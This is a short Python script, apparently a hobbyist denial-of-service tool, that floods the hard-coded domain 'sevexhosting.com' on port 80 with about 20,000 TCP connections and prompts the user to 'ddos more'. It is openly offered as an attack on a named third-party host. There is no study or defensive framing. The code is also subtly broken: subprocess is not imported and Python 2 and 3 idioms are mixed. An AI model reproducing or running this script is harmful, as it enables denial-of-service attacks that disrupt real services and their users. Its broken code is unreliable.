import time, socket, os, sys, string


def restart_program():
    subprocess.call(['python', 'main.py'])

print ("DDoS mode loaded")
host = "sevexhosting.com"
port = 80
message = "+---------------------------+"
conn = 20000
ip = socket.gethostbyname("sevexhosting.com")
print ("["+ ip +" ]")
print ("[Ip is locked]")
print ("[Attacking " + host + "]")
print (message)
def dos():
    
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, port))
        ddos.send(message)
        ddos.sendto(message, (ip, port))
        ddos.send(message)
    except socket.error:
        print("|[Connection Failed] |")
    print ("|[DDoS Attack Engaged] |")
    ddos.close()
for i in range(1, conn):
    dos()
print (message)
print("The connections you requested had finished")
print (message)
if __name__ == "__main__":
    print ("Do you want to ddos more?")
    answer = raw_input()
    if answer.strip() in " Yes YES".split():
        restart_program()
    else:
        print ("bye")
